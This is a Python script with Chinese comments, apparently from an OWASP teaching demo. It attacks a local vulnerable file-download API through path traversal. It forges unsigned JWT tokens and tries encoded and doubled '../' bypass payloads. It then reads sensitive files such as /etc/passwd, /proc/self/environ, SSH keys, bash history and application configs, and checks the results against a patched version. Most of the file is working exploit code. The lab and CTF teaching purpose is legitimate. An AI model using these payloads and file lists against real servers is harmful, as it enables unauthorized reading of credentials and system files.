#!/usr/bin/env python3
"""
Path Traversal（路徑穿越）攻擊腳本
=================================
此腳本展示如何利用 Path Traversal 漏洞讀取伺服器上的任意檔案。

攻擊原理：
---------
漏洞版本的檔案下載 API 沒有正確驗證檔案路徑，
攻擊者可以使用 ../ 來跳出上傳目錄，存取系統檔案。

常見攻擊目標：
- /etc/passwd - Linux 使用者列表
- /etc/shadow - 密碼雜湊（需要 root 權限）
- /flag.txt - CTF 挑戰的 flag
- ~/.ssh/id_rsa - SSH 私鑰
- /app/application.properties - 應用程式設定

作者：OWASP Demo
"""

import requests
import argparse
import base64
import json
from datetime import datetime, timedelta
from urllib.parse import quote

# 配置
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"

# 常見的敏感檔案路徑
SENSITIVE_FILES = [
    "/flag.txt",                                    # CTF Flag
    "/etc/passwd",                                  # Linux 使用者
    "/etc/hostname",                                # 主機名稱
    "/etc/hosts",                                   # 主機對應
    "/proc/version",                                # Linux 版本
    "/proc/self/environ",                           # 環境變數
    "/app/application.properties",                  # Spring Boot 設定
    "/root/.bash_history",                          # Root 指令歷史
    "/home/app/.bashrc",                            # 使用者設定
]

# Path Traversal 繞過技巧
TRAVERSAL_PATTERNS = [
    "../",                      # 基本穿越
    "..\\",                     # Windows 風格
    "....//",                   # 雙斜線繞過
    "..%2f",                    # URL 編碼
    "..%252f",                  # 雙重 URL 編碼
    "%2e%2e/",                  # 點的 URL 編碼
    "%2e%2e%2f",                # 完整 URL 編碼
    "..;/",                     # 分號繞過
    "..//",                     # 雙斜線
    "..././",                   # 混合穿越
]


def base64url_encode(data: bytes) -> str:
    """Base64 URL 編碼"""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')


def create_token(user_id: int = 2, username: str = "user") -> str:
    """建立偽造的 JWT Token"""
    header = {"alg": "HS256", "typ": "JWT"}
    now = datetime.utcnow()
    payload = {
        "sub": username,
        "userId": user_id,
        "username": username,
        "role": "USER",
        "iat": int(now.timestamp()),
        "exp": int((now + timedelta(hours=24)).timestamp())
    }
    
    header_encoded = base64url_encode(json.dumps(header).encode())
    payload_encoded = base64url_encode(json.dumps(payload).encode())
    fake_signature = base64url_encode(b"FAKE")
    
    return f"{header_encoded}.{payload_encoded}.{fake_signature}"


def read_file(filename: str, token: str, url: str = VULNERABLE_URL) -> tuple:
    """
    嘗試透過 Path Traversal 讀取檔案
    回傳 (成功與否, 內容或錯誤訊息)
    """
    response = requests.get(
        f"{url}/api/files/download",
        params={"filename": filename},
        headers={"Authorization": f"Bearer {token}"},
        allow_redirects=False
    )
    
    if response.status_code == 200:
        return True, response.text
    else:
        return False, f"HTTP {response.status_code}"


def attack_basic_traversal(token: str, target_file: str = "/flag.txt"):
    """
    🔴 基本 Path Traversal 攻擊
    """
    print("\n" + "=" * 60)
    print(f"🔴 Path Traversal 攻擊：讀取 {target_file}")
    print("=" * 60)
    
    # 計算需要多少層 ../
    # 假設上傳目錄在 /app/uploads
    # 要讀取 /flag.txt 需要 ../../flag.txt
    
    traversal_depths = [
        ("../", 1),
        ("../../", 2),
        ("../../../", 3),
        ("../../../../", 4),
        ("../../../../../", 5),
    ]
    
    for pattern, depth in traversal_depths:
        # 移除目標檔案開頭的 /
        file_path = target_file.lstrip('/')
        payload = pattern + file_path
        
        print(f"\n📋 嘗試：{payload}")
        
        success, content = read_file(payload, token, VULNERABLE_URL)
        
        if success:
            print(f"✅ 成功讀取檔案！")
            print(f"📄 內容：")
            print("-" * 40)
            # 只顯示前 500 字元
            print(content[:500])
            if len(content) > 500:
                print(f"... (共 {len(content)} 字元)")
            print("-" * 40)
            return True, content
        else:
            print(f"❌ 失敗：{content}")
    
    return False, None


def attack_read_sensitive_files(token: str):
    """
    🔴 讀取多個敏感檔案
    """
    print("\n" + "=" * 60)
    print("🔴 Path Traversal 攻擊：掃描敏感檔案")
    print("=" * 60)
    
    found_files = []
    
    for target in SENSITIVE_FILES:
        file_path = target.lstrip('/')
        # 使用多層穿越確保能到達根目錄
        payload = "../../../../" + file_path
        
        success, content = read_file(payload, token, VULNERABLE_URL)
        
        if success:
            found_files.append((target, content))
            preview = content[:50].replace('\n', '\\n')
            print(f"✅ {target}: {preview}...")
        else:
            print(f"❌ {target}: 無法讀取")
    
    print(f"\n📊 成功讀取 {len(found_files)}/{len(SENSITIVE_FILES)} 個檔案")
    
    return found_files


def attack_bypass_techniques(token: str, target_file: str = "/flag.txt"):
    """
    🔴 測試各種繞過技巧
    """
    print("\n" + "=" * 60)
    print("🔴 Path Traversal 繞過技巧測試")
    print("=" * 60)
    
    file_path = target_file.lstrip('/')
    
    for pattern in TRAVERSAL_PATTERNS:
        # 組合多層穿越
        payload = (pattern * 4) + file_path
        
        print(f"\n📋 模式：{pattern!r}")
        print(f"   Payload：{payload[:50]}...")
        
        success, content = read_file(payload, token, VULNERABLE_URL)
        
        if success and "FLAG" in content:
            print(f"✅ 繞過成功！找到 Flag：{content.strip()}")
            return True
        elif success:
            print(f"⚠️ 有回應但非預期內容")
        else:
            print(f"❌ 失敗：{content}")
    
    return False


def attack_read_source_code(token: str):
    """
    🔴 讀取應用程式原始碼
    """
    print("\n" + "=" * 60)
    print("🔴 Path Traversal 攻擊：讀取原始碼")
    print("=" * 60)
    
    # Java Spring Boot 常見檔案
    source_files = [
        "/app/app.jar",
        "/app/BOOT-INF/classes/application.properties",
        "/app/BOOT-INF/classes/application.yml",
    ]
    
    for target in source_files:
        file_path = target.lstrip('/')
        payload = "../../../../" + file_path
        
        success, content = read_file(payload, token, VULNERABLE_URL)
        
        if success:
            print(f"✅ {target}:")
            # 顯示前幾行
            lines = content.split('\n')[:10]
            for line in lines:
                print(f"   {line}")
            if len(content.split('\n')) > 10:
                print(f"   ... (共 {len(content.split(chr(10)))} 行)")
        else:
            print(f"❌ {target}: {content}")


def compare_vulnerability():
    """
    比較漏洞版本與安全版本
    """
    print("\n" + "=" * 60)
    print("📊 Path Traversal：漏洞版本 vs 安全版本")
    print("=" * 60)
    
    token = create_token()
    payload = "../../../../flag.txt"
    
    # 漏洞版本
    print("\n🔓 漏洞版本（http://localhost:8081）：")
    success, content = read_file(payload, token, VULNERABLE_URL)
    if success:
        print(f"   ✅ 成功讀取 /flag.txt: {content.strip()}")
    else:
        print(f"   ❌ {content}")
    
    # 安全版本
    print("\n🔒 安全版本（http://localhost:8082）：")
    try:
        success, content = read_file(payload, token, SECURE_URL)
        if success:
            print(f"   ⚠️ 意外成功：{content[:50]}")
        else:
            print(f"   ✅ 正確阻擋：{content}")
    except Exception as e:
        print(f"   ✅ 存取被拒絕：{e}")
    
    print("\n📋 安全版本的防禦措施：")
    print("   1. 路徑正規化（resolve + normalize）")
    print("   2. 檢查最終路徑是否在允許目錄內")
    print("   3. 白名單副檔名驗證")
    print("   4. 檔案重新命名為 UUID")


def main():
    parser = argparse.ArgumentParser(
        description="Path Traversal 攻擊工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
範例：
  python path_traversal.py --read /flag.txt       # 讀取指定檔案
  python path_traversal.py --scan                 # 掃描敏感檔案
  python path_traversal.py --bypass               # 測試繞過技巧
  python path_traversal.py --source               # 讀取原始碼
  python path_traversal.py --compare              # 比較漏洞/安全版本
  python path_traversal.py --all                  # 執行完整演示
        """
    )
    
    parser.add_argument("--read", type=str, help="讀取指定檔案（如 /flag.txt）")
    parser.add_argument("--scan", action="store_true", help="掃描敏感檔案")
    parser.add_argument("--bypass", action="store_true", help="測試繞過技巧")
    parser.add_argument("--source", action="store_true", help="讀取原始碼")
    parser.add_argument("--compare", action="store_true", help="比較漏洞/安全版本")
    parser.add_argument("--all", action="store_true", help="執行完整演示")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("📂 Path Traversal 攻擊工具")
    print("=" * 60)
    print(f"⚠️ 此工具僅供教育目的！請勿用於非法活動。")
    print(f"📍 目標：{VULNERABLE_URL}")
    
    token = create_token()
    
    if args.all:
        attack_basic_traversal(token, "/flag.txt")
        attack_read_sensitive_files(token)
        attack_bypass_techniques(token)
        compare_vulnerability()
    elif args.read:
        attack_basic_traversal(token, args.read)
    elif args.scan:
        attack_read_sensitive_files(token)
    elif args.bypass:
        attack_bypass_techniques(token)
    elif args.source:
        attack_read_source_code(token)
    elif args.compare:
        compare_vulnerability()
    else:
        parser.print_help()
        print("\n💡 快速開始：python path_traversal.py --all")


if __name__ == "__main__":
    main()
